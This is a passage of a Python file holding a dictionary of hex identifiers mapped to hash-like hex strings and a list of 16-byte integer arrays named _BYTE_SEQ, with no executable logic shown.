    "b9a98f315e41": "377a156e4eb83416582f195539a7cdf4",
    "3ee82fb3825d": "52263f1b9ea5f38125890e3a3866238a",
    "3a9dbcef6e80": "920dd3be613859b4e4b71beff9a98e8f",
    "5ba68777169a": "ccd30b5a0a0eed83f047801d35b03d5b",
    "2f6f05e16575": "bbbbd6e8b1b2ddb43dfa9860a7fde352",
    "4f1eb780c194": "1f0ea341d72aa3b4e58f8131b846cc87",
    "61b8dfb2fa5b": "76d271a255e04be5839976d126e4b804",
    "0c350b5ca87d": "c03cbbca1d88b8b7722962268a6ab597",
    "55fa449e5a9e": "d7b1e27169639e72904894cf1e71e3db",
    "2ad731a2a0ca": "1f7d13f7540d388c750f4c3e0764a0be",
    "b1b012f5d486": "6f0b7e527f7e0f1ed1fb0ab4803da190",
    "e3f0db4c104a": "42964fa0c712294841d8f7e69322b5c5",
    "bf115b284a8b": "cf8227b8a0462417ce60406adaa7c944",
    "6d5120a47fb8": "ca409a9b2b661dc693bf9381d07edf4e",
    "f9380b2501d8": "7e727a8bdb9ffcf6b962af59ab8b475e",
    "94ec1e6c7216": "476633751b4431807e01d949928ea49d",
    "b5f72b2db8ec": "e92c90c23a14b55086687edb8cc5588c",
    "06fdbe48e512": "333f3850ffe787892d0e749accc01c68",
    "e71e301de05c": "5eeb8d61a6a3f9c218769315218b85fd",
    "96989d03425a": "0217f189e731d448cea271b07d1d616f",
    "5e6bea88d632": "b8a6637d5787a374442c8f162c1f12c9",
    "11b94d7de30a": "e88b444b4af337751ab80c8f8810c4fa",
    "88a7299384cc": "76dab303507efd72ee0aa2b62a031e5c",
    "216ffda2cac4": "8713db75e9516c431e0e1f62680547d8",
    "55b23f8de68e": "908fab7c5b4c02171f47450ff2ee45fd",
    "0172b63851c7": "10e13f3c404b5d94cbd5310d0489a6c2",
    "870589b4798f": "a6c0886dcc26f2b69552e938f0c0e2f9",
    "0805fc155716": "d71dd8598e3074c3e9f3dd4c715342b5",
    "aee4672769f1": "97a691f18e376a7677e428b141ba25c1",
    "6c3ac724bc6b": "9f45f76cbadf02743b49d47dd3de67cd",
    "3b8bbbe77d9a": "24b33366347bfe9f932adf4067cf9c69",
    "3e1f8797dd67": "f6108cabf4e253d603a046202fa1d9bf",
    "62191fde526b": "6df1c333babf9aba32da1312c9467228",
    "4ca2118f4275": "bdf8f913eaeb4ba43fab374d976c890d",
    "133d43db7be5": "8aee51d7e23f4756ca0b08626778298a",
    "28075c2dc1fa": "a90cb9340be0103e344ba4fcf6f000b9",
    "f5366bcb1c62": "e137979420aa1fb3959920124107368e",
    "8fdb5a1bd20d": "a944b5776af873703529876b6ed483d1",
    "6fff30949a9b": "24bf14579c7b7723989670834368a623",
    "b61d7c59f305": "6c8fe703b10fd32dcb9ee51247af897d",
    "bb89128f607c": "bbf5e6fd41c8b2bdffa0d3d7e894c75b",
    "0b642eec5997": "9c99c4152f62876bbf517750d6a1d184",
    "277f53b99bfd": "ca7ab3692d85acfdccf7728e57bf8fa9",
    "70b43f3256f3": "dddcb36e9d5758065fd39576e1380031",
    "5d1a8cc87292": "b780a769a869f19e61d86d720050dd61",
    "3e36f7b77791": "93552f6a9d506b970eff1c625c3c21c6",
    "21aa1b559b36": "0f640f6731078a40a7fc1b8e2aaf9883",
    "532bfad542c7": "f993a4464e1a216c4df0d42f510ff4c0",
    "55bd3cabf0f4": "631dfa64c67f50d4eb1fb4333f2e6c9a",
    "cb3f63a62bf4": "59e23b8664b27c4abbdc84537a60bf23",
    "668dfda62bd1": "0212db296d011f498f77da661d239c9f",
    "d7d23276780d": "87d0f6a674958b6cb70ed5252770b6a5",
    "973c17962da5": "e236da843067d8695b400730bef4749f",
    "e40faa5581d1": "81c4e480d3080437aa36a5f45b8e6c3f",
    "fab4f0eecccd": "b828cbf18171009794ce1982b92835f5",
    "e635e0565e13": "1023c7630bb5fd22fe9136fcc6268d4a",
    "96f955749eaa": "682da7d93bc49c8cf3d14bee860bc4ba",
    "f7fc68e7ef95": "ff5b5faf3731ba314b9cdedbfdea34d6",
    "faa00257dbd4": "b6a76c3a43362d5e69c7d21c9434dbde",
    "436a8e3454d2": "7e21cd3add5b58d9596bda6c2307cea6",
    "38a8605d35c0": "9e6bfde5c4cffd7a94185c99ad61f760",
    "07e153cfcd0d": "faa461c41458136d012877ecee5dcbdb",
    "28babb8fc4e2": "9ca961f705e63e7504347beaf4b6ddcc",
    "fc31d387ad39": "5c10e326b06a18a555f98434eb82f2bf",
    "a77dfb6c1cee": "73f0eb6aa735b7dcba3d43e9deba9bb3",
    "35d5795e47e6": "098cd231c2edfd4850c0f52b8ee65cfc",
    "807160d6bafb": "24007f46e71bdf845c5dde3da9ed1571",
    "e2335751acf3": "b782655788b420962bf2cd2691d94001",
    "4549d4c62890": "01cf060361a6f05c9b68b63f1b022323",
    "cb222773b1d7": "072b7ccefe8f71835a2806c16b283622",
    "8005de66be6f": "1167796ee710a50406ffc760f35e0df6",
    "039aa81771d7": "3001a620c0299a2003172bc36a4c4650",
    "2b3c33af8375": "992440bcd0ff7063342b9ec31731cdc6",
    "b3847025974d": "d909d81dada65bafb42c8f4d44722d88",
    "14b64b844394": "e57fd03e98165836a040b9b13a3e449f",
    "2100b4857e5b": "b2584bc078f9837ba35e78c77586c0d8",
    "72d5ab7b253c": "fafbe86fd4bd26c8fa179559d8c82989",
    "08b865e29e1f": "f87a88e38e889e422a380cd3aeb30817",
    "7a27f295d180": "4a8b9cfcdac5365f181dbafc9e9f42a5",
    "7e076dc62dad": "52b3fac06ccc18da1633b51202dafff9",
    "1527163ebd95": "03c22b1d1d3f4f30df014625c34155b4",
    "879650f21c06": "a14f2c2be3851cbd60d33ac6e43badef",
    "4d73d9a50247": "45e1d127dd64e4dfa0e2332ed24c3a48",
    "d5aca12725f2": "af0b48e2585b74a683cd3e5218bbf298",
    "2863ba7a6e18": "0e7275f56326cde2d58c9efa567792f9",
    "ca23a83cb3ce": "b04da169cc77889a869d7eef1428e301",
    "4a6e562c82be": "6f885a139d8f3f66eeb13d7b8c4c3b5e",
    "076087eb3421": "8473a105ca4500009684470853edc853",
    "88054e533e20": "0242393bd78e016a849a50ebe1a61c88",
    "40962812662a": "13a18d65c82e727a10844bbebdb922b9",
    "9f53d44faf94": "a89aef8a4a368be1b61a0e0f4684987e",
    "59892fb54a48": "a2a915532cc47d5c83fc831a19a5ee67",
    "3f9f1ee0b437": "a3176af65ab2ec0db2ebfbea7e02abfc",
    "301684a60494": "a290a51c98c7f57939200ae795ca0146",
    "fcf9450d0c18": "b8d9e235dea805fb6f2cbb4a3a6b1152",
    "f57843fec2f7": "21e56233d6cc44e3cb311aeab86990f6",
    "f3414e7b7888": "ffef091a0ec55d6eb80130ff1e2ebd46",
    "195780e7771d": "d8ff69f88a5bcfac2296a234edb9c1d6",
    "dd7ba644ab96": "35ec400fbfbf71c42e35ce1c8602e45d",
    "644e13d661cf": "a7ef390ecf96b1f4daae95e81cc5129a",
    "ec8186c4e3f4": "5d0f419cdd4f5b7126d228d51fbe9ecd",
    "f7365ce27b83": "646f496bbc0c7ae68d851c3b9610c3dc",
    "2ad4d2a25501": "263db1c06b14f39ca3b4d17c693e9cc9",
    "6ffcf7a5eca7": "cfc9d2ae80b9e5d73ed186e0628c9ebe",
    "b3e3720bdb1c": "1b9b611e9bc99a9144504f6569d01af8",
    "6f3a12196edb": "7c5545023e3ae40ac2ceb0e0ce8e4010",
    "f3ae2561b59f": "273f08e84ba61862f73b05fc23261e5a",
    "fff42c886159": "4967176717708b30194b9730ba74b922",
    "328a774247f2": "135f1d637185b586042db32443aa7c94",
    "b71fb211f280": "28941c34947fed9df9baadb45b57f113",
    "1d7540a3c78e": "64c0270f991d664c902b29dc9f419ebf",
    "bb2540fee8d1": "1eb13f5224668629e1bfb6d6673263d4",
    "c532356863fc": "9e25ce2400c993bcf1e7b79fe7871201",
    "8ef5223754fb": "0d8e0098f73711367b6c98f8194c8be8",
    "b7fa24335d32": "bb68db1190eb33d8367d64a59d5d3e48",
    "4dbb0db5136f": "673031b7dcb23e625cd181b130e7f768",
    "35435312fc08": "296d63b2bfbac2e0a715e711674b5157",
    "931da8bb8f08": "fc80d90c33ca2cc8a5a42d7fd5f16133",
    "f0d9c4c86b69": "6138344af99d8af0b529d2b29506847b",
    "a6dd76f88224": "43e621dbd61c884a2baa095a4fee8147",
    "33a051e86a85": "d6d681038cee9a8eb27f14a772a40e9d",
    "950b2328c8ef": "e162178ed4d1808509cf830a6cf89151",
    "9bd087d2f6d1": "9e28f822c4cb5f01ec6f344846e12558",
    "687a9b7d498a": "1350973cf8d1f7cc046d5b51ac64fac0",
    "a50676d0bbd7": "5b5ccda3287693cfa9f772321ef6a398",
    "94b4d0820012": "3301578beadd146d6c30ad9dd8a05325",
    "3ec2fc4bb45f": "d67e4948dba0524d369f146809e08fa0",
    "c5bd03cd31d7": "bb62136bd0b4d0a72be69853b945c730",
    "ad836c7f6733": "7b2ca062d49bb410a9e0b858a3ac519f",
    "40113eddca3f": "52ee757d7adc67223c92cab3a5d72227",
    "cc6594f6984f": "1e7b72ebe5002374805c03350224c19e",
    "0afee77f0903": "add35ac0ca7c4a06ba5dab6e80805cbe",
    "18919cafa1a0": "8baa2fa1bc52ac07c7203035dd8b5a97",
    "eaadeb517900": "4f62932cac019d5a3d5dde051064a26f",
    "df4ee3a5df35": "9c693baaea8c3cf8dab24dda0067df20",
    "f6c4ad79b595": "af3fd1e5184f27cbe31baab99a3254f2",
    "573e71871404": "6e2d6aa3b419e597045a4218cef82eeb",
    "769bcc7718f1": "1c3c4acb4f8258098f847ba254903e3f",
    "de730aeb8354": "3d3e6cc56247fd25b6f6592e1b7dac73",
    "3a29c01ca110": "17e90d16c1b32ac43755b4be707de07e",
    "9459afca6032": "cf11b894143645832914f8dab8d51640",
    "f3755bf08c27": "b5c8cc2836bd52c3579a9356d3876cc9",
    "b2b91b7510b5": "a2ca950d9a5fa8ae06f4e820685a0cbc",
    "aa0d396712dc": "b1feb62b66c4df675c3b6d6e50fad423",
    "b8c965edb802": "e212e1a78605626b4a8d247315f3c641",
    "8ed56ee2a327": "569e3099a48d9391a86de98895644238",
    "e6291e29c7a5": "1132b6d69cbe959279f29f1c9e29260c",
    "7792c989a56d": "cf982620a3f4bee253ef27f3d5928f4a",
    "afa59e664cac": "bed956302b3cd160a57a55850c697115",
    "42da227f9a6a": "60313526a9d8a59e530f3106a7005f8b",
    "0973356a7ac9": "ccf2e13a3a6f090b8aa7f162052d4768",
    "e3d9c64bd8fa": "60aacbcbad78bfe9c9321a3ec2abc963",
    "cfed84dd12bc": "1be1e9611b83349c23a9b8981b5dcb1b",
    "4dbaf1d41d4d": "1ea92d1d2baf6ed40e45cd18d1538e56",
    "4dd1561894c8": "c194e23be116c8a32d59657f1c3d2d07",
    "bb37a95e84c3": "7c39141484dfa5bd69be40aeceb792d6",
    "f9c06a6c6727": "0a753ec18c2ab25909f5cfbe7b283aeb",
    "30c128aa3d5c": "fec962526850908037090e9f42d56a69",
    "91739aaab34e": "81bd2d4650aa8d75d4d89d67adc05f24",
    "c8420c7b0c3f": "8598f5e9fc656cb3cb24745c745c7332",
    "2c75c02c597f": "32cc5bb70c44453c7e18f8c94d2a6d5e",
    "6bf6a4f0b3f4": "809f20db2f2d626867cf79d07ea31fbc",
    "61246585b844": "47d134da8c644f7a04e8e93d661e8b23",
    "c0decf398632": "bffffebb847e38dbd4cac24ab5ba5a43",
    "d86cfd7672e6": "8cc5d9363d71bb685abb057aa94a62c0",
    "0c7a9e068c1a": "e4d1c11863f36a54b01abda24443c829",
    "7fccc1782b5b": "61419bc5493933755d745f61941f2f6f",
    "752d9548d3f3": "2eec961e8e54ebdbb976396f7f1f7ffc",
    "63137eda1b8d": "baebcb208288d906b622a8d143585abe",
    "16fc7bad4772": "d508a89229e357e86f380c939e6315da",
    "110ca28600ca": "32725abe568836642c4260c0996e2c14",
    "596eb21cda58": "1387b3cfcd93ed4529668ea81b049db6",
    "28d1c2a159a0": "d7d27c5c1671bc24c8374c09267c5587",
    "1c761bd544ee": "035a4139b2c24617ae3d2e300042afbd",
    "a3fadb763627": "d35c3d2daffa82418ba9554bbe319abe",
    "df16a2e6b264": "4581d64ef058d7cb1e46384a78956caa",
    "38ff3ca9fde1": "19a6581f7720a48911d6ce4abc75f998",
    "f4c2cf08d3ed": "76d9099a7a33c188ca29568776f99fcc",
    "0d6870cb58aa": "48db7b1d70b8816d5c9334258c566bfa",
    "226f5489fa1f": "4e3718af96fa8304bc0e301dd89ece3e",
    "4d62f19987a3": "7c2836a8db84071fd90afcf5e23e682e",
    "5c37382f3504": "5bf36b43b2502da86c00d7e95c2991f9",
    "d3d1481db8c3": "4b6ce11c3f90bbcc1c51888007b15768",
    "07bb9625115f": "95d774326a7a4fc471d3d4a7cadd7be8",
    "b5b62c5fce42": "10578f3042c9a3a92d5296d6f4784dc2",
    "e7ae85980ff8": "e6f71c008842ade6cb8f526777eef7b1",
    "cd0edb0527a3": "b2419971180563eb31de1dcbfe41c582",
    "29415251ca43": "0898e106e82289d35bdfec88bcef45b4",
    "6b1b2a6c8e28": "88131abe5206c2444f4ae16b74642c89",
    "846f1bc679c7": "303eb88f00c80728e088332eff69df7b",
    "a32ecc7a130a": "03288f58069d19f5fd80ebfd1e28dd97",
}

_BYTE_SEQ = [
    [208, 52, 107, 186, 4, 199, 35, 31, 129, 169, 86, 169, 225, 163, 251, 165],
    [219, 246, 227, 165, 13, 200, 22, 140, 53, 133, 166, 62, 52, 120, 176, 120],
    [119, 33, 119, 116, 206, 250, 94, 115, 186, 225, 153, 230, 145, 148, 157, 113],
    [93, 153, 16, 153, 157, 248, 204, 49, 107, 148, 116, 4, 4, 36, 91, 11],
    [22, 211, 57, 154, 242, 191, 119, 214, 215, 201, 190, 9, 54, 90, 219, 227],
    [77, 25, 190, 41, 132, 244, 23, 108, 221, 65, 2, 140, 15, 255, 183, 182],
    [173, 188, 79, 136, 220, 246, 215, 195, 228, 246, 245, 147, 113, 169, 37, 136],
    [137, 227, 70, 104, 87, 109, 126, 249, 136, 31, 68, 249, 223, 251, 121, 179],
    [172, 134, 3, 231, 26, 43, 29, 114, 71, 247, 57, 133, 137, 74, 111, 197],
    [58, 66, 122, 90, 95, 87, 208, 130, 193, 193, 119, 10, 143, 220, 4, 179],
    [223, 124, 116, 227, 245, 58, 19, 62, 255, 232, 132, 118, 196, 245, 114, 70],
    [4, 181, 181, 147, 187, 23, 176, 115, 133, 10, 30, 139, 4, 163, 238, 32],
    [228, 236, 130, 225, 51, 188, 96, 115, 253, 159, 40, 83, 16, 7, 136, 131],
    [190, 195, 100, 90, 215, 142, 14, 135, 61, 68, 178, 143, 245, 212, 115, 213],
    [218, 169, 199, 248, 210, 121, 220, 94, 50, 73, 205, 144, 85, 49, 108, 215],
    [133, 35, 114, 178, 80, 123, 141, 155, 230, 203, 22, 185, 145, 64, 78, 25],
    [135, 219, 109, 248, 134, 63, 159, 25, 51, 217, 105, 217, 197, 223, 23, 79],
    [6, 195, 163, 132, 114, 230, 6, 236, 48, 27, 46, 197, 245, 221, 82, 176],
    [186, 224, 163, 62, 132, 134, 200, 239, 253, 8, 124, 75, 28, 48, 93, 14],
    [20, 20, 67, 96, 254, 116, 135, 235, 54, 246, 211, 11, 252, 5, 142, 44],
    [108, 245, 214, 83, 30, 45, 125, 65, 59, 175, 165, 196, 111, 5, 177, 224],
    [84, 6, 24, 161, 244, 9, 26, 25, 70, 85, 252, 190, 49, 76, 47, 90],
    [193, 245, 46, 184, 242, 52, 87, 233, 25, 135, 84, 237, 175, 52, 128, 218],
    [12, 194, 89, 179, 194, 195, 20, 63, 87, 131, 130, 130, 69, 65, 82, 186],
    [175, 143, 149, 51, 212, 74, 109, 223, 14, 79, 108, 188, 170, 28, 245, 107],
    [220, 27, 116, 167, 22, 166, 53, 92, 214, 124, 60, 146, 232, 35, 224, 26],
    [176, 211, 211, 54, 99, 96, 76, 23, 8, 249, 61, 212, 165, 38, 72, 24],
    [169, 58, 246, 185, 3, 201, 243, 255, 230, 243, 208, 96, 209, 39, 229, 97],
    [129, 142, 32, 52, 210, 18, 28, 3, 149, 53, 204, 29, 43, 21, 216, 206],
    [45, 165, 86, 154, 210, 203, 128, 44, 41, 188, 81, 123, 25, 72, 182, 223],
    [170, 60, 135, 55, 157, 68, 27, 92, 2, 100, 242, 74, 226, 80, 59, 1],
    [208, 248, 72, 41, 183, 182, 174, 250, 96, 209, 150, 61, 43, 60, 52, 148],
    [7, 182, 184, 160, 197, 145, 120, 122, 89, 52, 39, 157, 20, 8, 40, 80],
    [14, 50, 42, 186, 59, 124, 29, 29, 47, 38, 173, 51, 63, 52, 142, 111],
    [223, 110, 50, 12, 230, 135, 22, 192, 110, 131, 48, 223, 223, 92, 172, 165],
    [213, 50, 251, 42, 174, 5, 241, 180, 55, 102, 127, 39, 57, 117, 4, 137],
    [248, 51, 203, 32, 57, 212, 114, 71, 98, 77, 250, 216, 134, 76, 25, 182],
    [189, 67, 45, 23, 82, 30, 187, 102, 183, 111, 191, 77, 194, 26, 125, 35],
    [121, 213, 89, 187, 138, 106, 18, 156, 104, 198, 73, 50, 254, 57, 242, 131],
    [131, 40, 45, 76, 50, 237, 109, 203, 82, 65, 186, 218, 158, 191, 154, 17],
    [32, 247, 166, 181, 15, 29, 175, 65, 244, 76, 26, 172, 93, 222, 192, 90],
    [164, 171, 100, 190, 70, 48, 66, 182, 171, 86, 56, 205, 182, 216, 199, 35],
    [134, 127, 2, 114, 228, 222, 27, 47, 204, 29, 176, 71, 146, 117, 227, 107],
    [66, 123, 253, 233, 148, 5, 201, 123, 15, 34, 13, 106, 153, 122, 11, 101],
    [41, 202, 255, 143, 16, 91, 11, 42, 177, 217, 137, 200, 224, 162, 139, 96],
    [101, 208, 80, 243, 20, 98, 28, 181, 218, 116, 12, 33, 54, 251, 149, 30],
    [68, 157, 54, 77, 95, 34, 46, 51, 9, 118, 227, 73, 179, 56, 91, 156],
    [208, 164, 57, 164, 99, 13, 180, 93, 58, 239, 84, 36, 153, 90, 93, 147],
    [233, 19, 154, 163, 58, 130, 240, 10, 48, 247, 35, 239, 165, 252, 227, 61],
    [84, 201, 166, 52, 141, 25, 123, 152, 193, 146, 126, 130, 243, 87, 199, 7],
    [64, 3, 96, 182, 98, 168, 76, 253, 155, 139, 8, 6, 111, 209, 129, 220],
    [102, 73, 103, 13, 249, 174, 203, 251, 107, 197, 226, 199, 87, 71, 171, 113],
    [67, 128, 47, 60, 7, 233, 253, 39, 45, 44, 87, 81, 156, 88, 134, 175],
    [66, 210, 144, 55, 99, 46, 229, 195, 63, 198, 104, 46, 101, 219, 244, 109],
    [0, 163, 53, 36, 98, 98, 125, 191, 246, 136, 212, 108, 12, 130, 48, 46],
    [200, 9, 90, 238, 178, 78, 103, 85, 165, 245, 64, 110, 205, 169, 89, 158],
    [11, 56, 246, 141, 100, 114, 237, 40, 185, 73, 2, 243, 220, 218, 95, 158],
    [147, 48, 251, 116, 14, 190, 107, 174, 80, 101, 2, 207, 9, 77, 16, 121],
    [254, 242, 3, 149, 137, 162, 68, 126, 247, 23, 167, 120, 53, 81, 175, 21],
    [165, 26, 230, 76, 210, 233, 193, 22, 100, 45, 239, 137, 233, 169, 11, 172],
    [170, 174, 52, 218, 84, 191, 120, 51, 17, 254, 200, 227, 243, 188, 167, 20],
    [1, 244, 123, 47, 44, 197, 143, 104, 84, 95, 87, 166, 22, 4, 40, 107],
    [183, 62, 224, 204, 193, 162, 255, 47, 128, 99, 123, 8, 217, 141, 173, 16],
    [163, 102, 196, 135, 211, 226, 232, 153, 166, 167, 93, 185, 234, 180, 115, 49],
    [32, 143, 52, 228, 253, 137, 134, 167, 43, 25, 112, 198, 0, 203, 127, 225],
    [187, 116, 116, 157, 48, 253, 21, 49, 220, 26, 164, 52, 226, 166, 70, 172],
    [21, 156, 228, 247, 237, 165, 9, 149, 171, 78, 45, 16, 161, 52, 179, 123],
    [217, 96, 91, 58, 79, 90, 57, 13, 133, 145, 92, 121, 197, 150, 150, 39],
    [70, 202, 98, 157, 210, 210, 123, 204, 26, 226, 151, 201, 8, 43, 172, 6],
    [89, 48, 228, 207, 88, 126, 70, 236, 139, 219, 223, 151, 7, 9, 241, 74],
    [132, 17, 33, 189, 154, 54, 36, 148, 0, 205, 2, 1, 69, 186, 80, 158],
    [13, 243, 14, 4, 120, 254, 66, 8, 153, 149, 219, 243, 0, 127, 72, 156],
    [46, 246, 65, 51, 47, 43, 93, 199, 224, 136, 56, 54, 198, 151, 61, 44],
    [90, 120, 200, 183, 163, 139, 119, 2, 9, 186, 175, 35, 247, 248, 109, 140],
    [16, 207, 47, 123, 108, 182, 80, 21, 113, 183, 189, 81, 222, 41, 136, 137],
    [100, 251, 216, 236, 130, 149, 101, 112, 173, 120, 3, 209, 172, 136, 36, 96],
    [220, 204, 47, 181, 35, 248, 107, 183, 65, 84, 160, 169, 231, 133, 140, 12],
    [197, 92, 189, 165, 137, 201, 77, 217, 242, 18, 49, 194, 134, 229, 80, 150],
    [86, 161, 200, 173, 243, 21, 130, 214, 197, 67, 67, 219, 16, 156, 117, 6],
    [38, 225, 105, 122, 42, 237, 119, 161, 107, 10, 159, 114, 145, 123, 117, 150],
    [193, 161, 222, 77, 74, 64, 27, 176, 23, 33, 1, 219, 175, 32, 78, 104],
    [149, 25, 127, 251, 254, 197, 181, 251, 255, 15, 36, 203, 224, 41, 193, 250],
    [54, 173, 155, 61, 26, 149, 249, 141, 161, 174, 59, 153, 85, 130, 53, 97],
    [66, 184, 13, 172, 96, 49, 178, 183, 104, 7, 122, 169, 62, 192, 92, 209],
    [119, 207, 82, 74, 205, 2, 13, 86, 70, 232, 75, 192, 9, 251, 84, 109],
    [103, 84, 101, 227, 252, 196, 223, 85, 190, 88, 140, 116, 112, 180, 90, 136],
    [200, 177, 191, 16, 19, 115, 203, 154, 111, 110, 153, 242, 61, 82, 11, 140],
    [77, 213, 202, 111, 148, 113, 193, 160, 7, 98, 182, 12, 16, 69, 74, 74],
    [151, 169, 157, 77, 170, 39, 194, 8, 216, 247, 91, 48, 144, 24, 22, 48],
    [192, 108, 131, 120, 73, 96, 177, 232, 33, 241, 20, 82, 147, 102, 129, 18],
    [176, 233, 24, 46, 198, 254, 190, 95, 85, 13, 70, 229, 66, 74, 243, 118],
    [215, 170, 239, 99, 106, 134, 66, 149, 139, 176, 124, 191, 56, 146, 110, 180],
    [13, 95, 74, 215, 190, 112, 155, 29, 17, 97, 193, 60, 146, 203, 94, 2],
    [85, 72, 208, 243, 40, 39, 137, 106, 203, 30, 27, 1, 63, 95, 0, 120],
    [116, 137, 193, 102, 170, 135, 133, 145, 185, 190, 220, 54, 249, 107, 131, 223],
    [45, 119, 171, 162, 224, 112, 213, 32, 78, 122, 77, 225, 58, 222, 109, 234],
    [152, 87, 211, 101, 124, 167, 104, 183, 81, 60, 160, 251, 251, 36, 59, 14],
    [200, 163, 250, 124, 79, 14, 24, 144, 209, 212, 105, 203, 207, 220, 64, 247],
    [184, 175, 200, 82, 203, 23, 13, 116, 170, 27, 242, 247, 198, 25, 141, 165],
    [123, 3, 206, 58, 65, 31, 97, 15, 170, 78, 144, 196, 179, 212, 117, 57],
    [50, 208, 103, 125, 221, 255, 243, 99, 30, 156, 37, 0, 74, 31, 22, 232],
    [94, 37, 58, 71, 31, 130, 38, 94, 14, 212, 156, 47, 57, 78, 105, 168],
    [112, 168, 47, 164, 14, 226, 164, 229, 223, 154, 109, 192, 57, 1, 0, 205],
    [249, 111, 117, 113, 35, 63, 141, 10, 171, 153, 85, 97, 137, 250, 234, 124],
    [98, 29, 145, 63, 189, 145, 15, 42, 118, 78, 11, 236, 221, 183, 134, 129],
    [17, 117, 214, 248, 224, 242, 152, 49, 67, 72, 188, 213, 142, 41, 95, 18],
    [102, 111, 243, 108, 174, 117, 4, 168, 200, 99, 160, 227, 80, 10, 34, 0],
    [34, 244, 100, 118, 99, 132, 159, 113, 82, 170, 8, 118, 52, 179, 244, 228],
    [73, 51, 114, 3, 72, 80, 141, 180, 85, 100, 96, 112, 136, 227, 41, 131],
    [161, 158, 149, 107, 148, 129, 112, 122, 117, 132, 56, 149, 208, 227, 41, 41],
    [198, 197, 109, 23, 226, 243, 36, 216, 13, 93, 244, 142, 234, 151, 237, 37],
    [71, 249, 7, 23, 225, 43, 0, 205, 197, 246, 45, 209, 224, 170, 11, 169],
    [196, 192, 201, 27, 139, 174, 210, 97, 90, 232, 12, 170, 15, 224, 250, 91],
    [15, 171, 85, 147, 115, 214, 87, 92, 39, 85, 114, 152, 16, 41, 130, 39],
    [140, 204, 5, 35, 166, 58, 123, 200, 174, 120, 230, 0, 178, 110, 199, 11],
    [172, 7, 96, 206, 0, 174, 92, 45, 199, 138, 179, 51, 40, 81, 115, 196],
    [122, 72, 137, 76, 115, 87, 170, 233, 47, 107, 198, 162, 17, 12, 121, 180],
    [155, 120, 7, 139, 143, 226, 19, 14, 204, 56, 235, 247, 23, 172, 110, 66],
    [255, 235, 108, 122, 209, 78, 207, 12, 17, 0, 153, 58, 4, 95, 66, 219],
    [82, 215, 160, 173, 86, 56, 222, 149, 132, 236, 87, 54, 198, 205, 77, 80],
    [211, 73, 42, 82, 89, 156, 53, 219, 32, 182, 147, 60, 143, 5, 188, 118],
    [253, 32, 224, 118, 2, 44, 36, 43, 196, 26, 74, 158, 136, 14, 31, 92],
    [11, 184, 32, 75, 141, 167, 23, 235, 24, 221, 109, 112, 2, 73, 130, 200],
    [89, 188, 126, 30, 152, 134, 35, 87, 25, 111, 19, 217, 215, 125, 21, 232],
    [195, 66, 207, 117, 184, 206, 92, 86, 85, 36, 128, 32, 15, 16, 115, 245],
    [255, 248, 90, 176, 234, 235, 105, 73, 66, 44, 60, 22, 114, 143, 131, 197],
    [18, 164, 19, 166, 91, 64, 235, 122, 194, 131, 161, 42, 2, 220, 92, 238],
    [239, 106, 162, 37, 131, 130, 235, 248, 67, 102, 220, 252, 219, 139, 95, 19],
    [62, 161, 118, 217, 0, 107, 51, 220, 105, 164, 188, 10, 221, 11, 135, 87],
    [229, 114, 204, 143, 114, 223, 145, 165, 34, 114, 13, 155, 151, 9, 241, 209],
    [156, 246, 70, 241, 108, 16, 61, 189, 98, 221, 155, 250, 21, 208, 243, 191],
    [218, 125, 183, 95, 114, 34, 227, 42, 54, 46, 10, 20, 64, 81, 9, 76],
    [244, 169, 129, 243, 98, 63, 178, 231, 235, 194, 250, 21, 99, 133, 144, 32],
    [122, 62, 126, 18, 144, 161, 52, 116, 65, 169, 44, 19, 186, 26, 17, 172],
    [234, 17, 182, 9, 80, 185, 165, 13, 127, 246, 84, 170, 12, 250, 128, 177],
    [117, 81, 252, 73, 105, 249, 201, 177, 136, 59, 95, 139, 112, 116, 137, 9],
    [92, 7, 59, 174, 94, 177, 234, 108, 174, 55, 190, 238, 58, 181, 95, 202],
    [213, 143, 203, 241, 243, 129, 237, 36, 10, 64, 195, 185, 132, 109, 149, 182],
    [239, 201, 33, 30, 128, 235, 183, 181, 194, 30, 193, 156, 67, 237, 127, 235],
    [0, 63, 93, 103, 143, 82, 91, 242, 247, 164, 183, 210, 67, 34, 165, 85],
    [198, 23, 200, 32, 94, 148, 219, 105, 53, 132, 223, 217, 56, 39, 120, 10],
    [220, 163, 200, 94, 130, 101, 103, 124, 67, 108, 200, 35, 141, 56, 95, 73],
    [55, 217, 145, 53, 81, 248, 46, 205, 194, 85, 238, 254, 231, 22, 201, 199],
    [173, 162, 206, 82, 129, 115, 253, 185, 112, 7, 32, 82, 55, 215, 57, 24],
    [114, 210, 167, 178, 188, 169, 57, 100, 168, 162, 171, 16, 148, 72, 43, 108],
    [55, 163, 153, 236, 220, 216, 0, 77, 8, 23, 137, 108, 246, 78, 68, 71],
    [100, 114, 212, 65, 226, 19, 76, 122, 49, 208, 154, 253, 56, 235, 45, 186],
    [87, 220, 135, 172, 83, 42, 199, 136, 142, 39, 23, 193, 254, 131, 164, 170],
    [252, 242, 9, 89, 46, 56, 82, 64, 82, 214, 41, 226, 222, 203, 94, 61],
    [158, 166, 147, 242, 188, 16, 57, 19, 132, 213, 21, 131, 128, 213, 144, 160],
    [243, 33, 237, 121, 38, 240, 51, 35, 153, 153, 234, 160, 91, 185, 52, 222],
    [239, 93, 171, 212, 6, 113, 205, 58, 11, 154, 169, 195, 72, 43, 80, 47],
    [39, 177, 254, 185, 68, 148, 1, 90, 250, 226, 34, 203, 67, 197, 20, 22],
    [79, 229, 32, 247, 131, 248, 46, 169, 85, 55, 124, 180, 248, 87, 68, 20],
    [157, 196, 226, 144, 128, 236, 70, 18, 144, 213, 73, 193, 149, 176, 17, 246],
    [173, 231, 219, 58, 38, 245, 177, 65, 197, 87, 85, 62, 13, 56, 253, 161],
    [211, 152, 108, 15, 222, 239, 253, 238, 231, 107, 164, 49, 133, 142, 92, 166],
    [207, 69, 126, 219, 86, 39, 23, 140, 169, 0, 51, 218, 248, 25, 169, 119],
    [233, 19, 20, 149, 175, 232, 199, 40, 18, 232, 208, 6, 142, 133, 255, 105],
    [158, 65, 234, 119, 77, 12, 233, 46, 82, 217, 116, 89, 60, 161, 22, 231],
    [205, 145, 149, 88, 217, 154, 252, 242, 226, 172, 220, 202, 212, 131, 87, 250],
    [146, 125, 192, 101, 125, 106, 251, 236, 148, 195, 107, 215, 134, 246, 33, 225],
    [153, 10, 33, 60, 153, 172, 118, 104, 100, 195, 240, 33, 242, 219, 81, 179],
    [145, 123, 229, 142, 232, 233, 208, 214, 169, 24, 99, 182, 44, 213, 213, 205],
    [233, 185, 246, 198, 215, 113, 28, 88, 247, 150, 10, 75, 197, 45, 91, 81],
